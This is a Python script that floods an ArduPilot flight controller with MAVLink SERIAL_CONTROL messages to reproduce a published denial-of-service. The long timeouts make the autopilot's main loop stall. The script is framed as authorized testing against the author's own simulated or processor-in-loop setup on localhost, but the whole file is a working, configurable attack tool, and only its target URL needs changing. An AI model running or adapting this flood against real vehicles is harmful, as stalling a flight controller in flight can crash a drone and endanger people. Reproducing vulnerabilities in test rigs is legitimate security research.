#!/usr/bin/env python3
"""Target-agnostic MAVLink SERIAL_CONTROL flood, for authorized security testing of
*our own* ArduPilot (SITL or PILS) on localhost. It reproduces the denial-of-service
from Soshima & Suzaki's ROHITL paper: a SERIAL_CONTROL with a long timeout makes
ArduPilot spin in hal.scheduler->delay(1) inside GCS_serial_control.cpp, stalling
main_loop. The same script runs unchanged against SITL and PILS; only the URL differs.

    attack-serial-control.py tcp:127.0.0.1:5760 [--device 0] [--timeout-ms 3000]
                             [--rate 50] [--duration 10] [--baud 115200]

--device picks SERIALn (0..9 -> SERIAL_CONTROL_SERIAL0..9). The script does not
decide whether the vehicle crashed; it only drives the attack and reports whether
ArduPilot heartbeats keep arriving, so the operator can see the stall. Exit 0 when
the run finishes. Needs pymavlink.
"""
import argparse
import sys
import time

from pymavlink import mavutil

GCS_SYSTEM = 255
HEARTBEAT_INTERVAL = 1.0
# the SERIAL_CONTROL data field is a fixed 70 bytes
SERIAL_CONTROL_DATA_LEN = 70


def serial_device(index):
    """SERIAL_CONTROL device number for SERIALn (the paper targets SERIAL0 + X)."""
    return mavutil.mavlink.SERIAL_CONTROL_SERIAL0 + index


def attack(conn, device, timeout_ms, baud, rate, duration, report=print):
    """Flood SERIAL_CONTROL on an already-open connection.

    Sends `rate` SERIAL_CONTROL messages per second for `duration` seconds, each with
    SERIAL_CONTROL_FLAG_RESPOND and the given timeout, plus a GCS heartbeat every
    second. Drains incoming traffic to track whether the flight controller still
    answers. Returns the number of SERIAL_CONTROL messages sent.
    """
    flags = mavutil.mavlink.SERIAL_CONTROL_FLAG_RESPOND
    data = [0] * SERIAL_CONTROL_DATA_LEN
    interval = 1.0 / rate if rate > 0 else 0.0

    start = time.time()
    next_send = start
    last_heartbeat = 0.0
    last_report = start
    sent = 0
    reported_sent = 0
    last_fc_heartbeat = None  # wall-clock of the last heartbeat from the vehicle

    while time.time() - start < duration:
        now = time.time()

        # our GCS heartbeat, so ArduPilot keeps treating us as a live GCS
        if now - last_heartbeat >= HEARTBEAT_INTERVAL:
            conn.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                                    mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
            last_heartbeat = now

        # the attack itself: a SERIAL_CONTROL with a long timeout
        if now >= next_send:
            conn.mav.serial_control_send(device, flags, timeout_ms, baud, 0, data)
            sent += 1
            next_send += interval
            if next_send < now:  # never fall behind the wall clock
                next_send = now + interval

        # note any heartbeat coming back from the vehicle (not our own)
        msg = conn.recv_match(blocking=False)
        if msg is not None and msg.get_type() == "HEARTBEAT" and msg.get_srcSystem() != GCS_SYSTEM:
            last_fc_heartbeat = time.time()

        # once a second: how much we have sent and whether the vehicle still answers
        if now - last_report >= 1.0:
            if last_fc_heartbeat is None:
                alive = "no heartbeat yet"
            else:
                age = now - last_fc_heartbeat
                alive = "ArduPilot alive" if age < 2.0 else f"no heartbeat for {age:.1f}s (stalled?)"
            report(f"sent {sent} SERIAL_CONTROL ({sent - reported_sent}/s), {alive}")
            reported_sent = sent
            last_report = now

        if interval:
            time.sleep(min(interval, 0.005))

    report(f"done: sent {sent} SERIAL_CONTROL messages in {duration:.0f}s")
    return sent


def main(argv=None):
    ap = argparse.ArgumentParser(description="SERIAL_CONTROL flood against our own ArduPilot (SITL or PILS)")
    ap.add_argument("url", nargs="?", default="tcp:127.0.0.1:5760",
                    help="MAVLink endpoint, e.g. tcp:127.0.0.1:5760 (SITL or PILS)")
    ap.add_argument("--device", type=int, default=0, help="SERIALn index 0..9 (default 0)")
    ap.add_argument("--timeout-ms", type=int, default=3000, help="SERIAL_CONTROL timeout (default 3000)")
    ap.add_argument("--rate", type=float, default=50.0, help="messages per second (default 50)")
    ap.add_argument("--duration", type=float, default=10.0, help="seconds to attack (default 10)")
    ap.add_argument("--baud", type=int, default=115200, help="SERIAL_CONTROL baudrate field (default 115200)")
    args = ap.parse_args(argv)

    conn = mavutil.mavlink_connection(args.url, source_system=GCS_SYSTEM)
    print(f"connecting to {args.url} ...", flush=True)
    if conn.wait_heartbeat(timeout=30) is None:
        print("warning: no heartbeat within 30 s; attacking anyway", flush=True)
    else:
        print("connected", flush=True)
    attack(conn, serial_device(args.device), args.timeout_ms, args.baud, args.rate, args.duration)
    return 0


if __name__ == "__main__":
    sys.exit(main())
